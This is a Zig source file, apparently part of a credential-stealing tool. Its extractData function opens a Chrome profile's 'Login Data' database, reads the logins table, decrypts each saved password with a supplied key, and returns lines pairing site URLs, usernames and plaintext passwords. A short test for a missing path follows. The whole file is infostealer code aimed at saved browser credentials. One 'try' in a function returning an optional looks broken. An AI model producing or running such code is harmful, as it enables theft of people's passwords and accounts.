const std = @import("std");
const sqLoot = @import("../parsers/sqLoot.zig");
const file_io = @import("../parsers/file_io.zig");
const chrome_crypto = @import("../crypto/chrome_crypto.zig");

pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator, key: [32]u8) ?[][]const u8 {
    const db_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Login Data" }) catch return null;
    defer allocator.free(db_path);

    const mapped = file_io.MappedFile.open(db_path) orelse return null;
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return null;
    defer db.deinit();

    const rows = db.readTable("logins") catch return null;
    defer allocator.free(rows);

    const cols = db.getColumnNames("logins") catch return null;
    defer {
        for (cols) |c| allocator.free(c);
        allocator.free(cols);
    }
    const url_idx = sqLoot.findColumnIndex(cols, "origin_url") orelse return null;
    const user_idx = sqLoot.findColumnIndex(cols, "username_value") orelse return null;
    const pass_idx = sqLoot.findColumnIndex(cols, "password_value") orelse return null;

    var list = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (list.items) |item| allocator.free(item);
        list.deinit();
    }

    for (rows) |row| {
        if (row.len <= @max(url_idx, user_idx, pass_idx)) continue;

        const origin_url = if (row[url_idx] != .null) row[url_idx].text else "";
        const username = if (row[user_idx] != .null) row[user_idx].text else "";
        const encrypted = if (row[pass_idx] != .null and row[pass_idx] == .blob) row[pass_idx].blob else continue;

        const decrypt_buf = try allocator.alloc(u8, encrypted.len);
        defer allocator.free(decrypt_buf);
        const decrypted_result = chrome_crypto.decryptPassword(encrypted, key, decrypt_buf) orelse continue;
        const decrypted = allocator.dupe(u8, decrypted_result) catch continue;

        const line = std.fmt.allocPrint(allocator, "{s}\t{s}\t{s}\n", .{ origin_url, username, decrypted }) catch {
            allocator.free(decrypted);
            continue;
        };
        allocator.free(decrypted);
        list.append(line) catch continue;
    }

    if (list.items.len == 0) return null;
    return list.toOwnedSlice();
}

test "extractData returns null for missing path" {
    const result = extractData("C:\\__nonexistent__", std.testing.allocator, [_]u8{0} ** 32);
    try std.testing.expect(result == null);
}
